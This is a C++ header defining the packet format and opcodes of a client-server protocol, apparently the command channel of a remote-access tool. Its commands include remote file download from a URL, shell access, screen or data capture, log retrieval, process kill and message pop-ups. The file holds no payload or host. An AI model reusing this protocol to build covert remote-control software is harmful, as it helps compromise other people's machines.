#pragma once

#include <string>
#include <vector>

#include "crc32.h"

typedef unsigned char byte;

#define MAX_OPCODE ((uint16_t)0X0F)

enum Opcode : byte
{
	NOP		= 0x00,
	HELLO	= 0x01,
	TEST	= 0x02,
	AUTH	= 0x03,
	BYE		= 0x04,
	EXEC	= 0x05,
	PING	= 0x06,
	PONG	= 0x07,
	SHOW	= 0x08,
	DOWNLOAD = 0x09,
	SHELL	= 0x0A,
	CAPTURE = 0x0B,
	KILL	= 0x0C,
	XFER	= 0x0D,
	LOGS	= 0x0E,
	INFO	= 0x0F
};

#pragma pack(push, 1)
struct _header
{
	byte sync[3] = { 'S', 'Y', 'N' };
	uint16_t opcode = Opcode::NOP;
	uint32_t size = sizeof(_header);
	uint32_t crc32 = 0;
};
#pragma pack(pop)

struct _packet
{
public:
	_header header;
	std::vector<byte> data;
};

template<typename T>
static void writeNumericValue(_packet *packet, T val)
{
	size_t bytesToWrite = sizeof(val);
	packet->data.resize(packet->data.size() + bytesToWrite);
	memcpy(&packet->data[packet->data.size() - bytesToWrite], &val, bytesToWrite);
	packet->header.size += bytesToWrite;
}

static void writeBytes(_packet *packet, const byte *data, size_t size)
{
	packet->data.resize(packet->data.size() + size);
	memcpy(&packet->data[packet->data.size() - size], data, size);
	packet->header.size += size;
}

static uint32_t CalculateCRC32(_packet *p)
{
	std::vector<byte> payload(p->header.size);
	uint32_t tmp = p->header.crc32;
	 
	p->header.crc32 = 0;
	memcpy(&payload[0], &p->header, sizeof(_header));

	if (!p->data.empty())
		memcpy(&payload[sizeof(_header)], p->data.data(), p->data.size());

	uint32_t crc32 = CRC32::crc32(payload.data(), payload.size());
	p->header.crc32 = tmp;

	return crc32;
}

struct NopPacket : public _packet
{
	NopPacket()
	{
		header.opcode = NOP;
		header.crc32 = CalculateCRC32(this);
	}
};

struct HelloPacket : public _packet
{
	HelloPacket()
	{
		header.opcode =  HELLO;
		header.crc32 = CalculateCRC32(this);
	}
};

struct TestPacket : public _packet
{
	TestPacket(const char *expr)
	{
		header.opcode = TEST;
		writeBytes(this, (const byte*)expr, strlen(expr));
		header.crc32 = CalculateCRC32(this);
	}
};

struct ShowMsgPacket : public _packet
{
	ShowMsgPacket(const char *msg, const char *caption)
	{
		header.opcode = SHOW;
		writeBytes(this, (const byte*)msg, strlen(msg) + 1);
		writeBytes(this, (const byte*)caption, strlen(caption) + 1);
		header.crc32 = CalculateCRC32(this);
	}
};

struct DownloadFilePacket : public _packet
{
	DownloadFilePacket(const char *url, const char *dst)
	{
		header.opcode = DOWNLOAD;
		writeBytes(this, (const byte*)url, strlen(url) + 1);
		writeBytes(this, (const byte*)dst, strlen(dst) + 1);
		header.crc32 = CalculateCRC32(this);
	}
};

struct ShellPacket : public _packet
{
	ShellPacket()
	{
		header.opcode = SHELL;
		header.crc32 = CalculateCRC32(this);
	}
};

struct ByePacket : public _packet
{
	ByePacket(const char *reason)
	{
		header.opcode = BYE;
		writeBytes(this, (const byte*)reason, strlen(reason) + 1);
		header.crc32 = CalculateCRC32(this);
	}
};

struct DataPacket : public _packet
{
	DataPacket(const byte *data, std::size_t size)
	{
		header.opcode = XFER;
		writeNumericValue(this, size);
		writeBytes(this, data, size);
		header.crc32 = CalculateCRC32(this);
	}
};

struct AuthPacket : public _packet
{
	AuthPacket(const byte *data, std::size_t size)
	{
		header.opcode = AUTH;
		writeBytes(this, data, size);
		header.crc32 = CalculateCRC32(this);
	}
};

struct LogsPacket : public _packet
{
	LogsPacket()
	{
		header.opcode = LOGS;
		header.crc32 = CalculateCRC32(this);
	}
};

struct PingPacket : public _packet
{
	PingPacket()
	{
		header.opcode = PING;
		header.crc32 = CalculateCRC32(this);
	}
};

struct PongPacket : public _packet
{
	PongPacket()
	{
		header.opcode = PONG;
		header.crc32 = CalculateCRC32(this);
	}
};

struct InfoPacket : public _packet
{
	InfoPacket()
	{
		header.opcode = INFO;
		header.crc32 = CalculateCRC32(this);
	}
};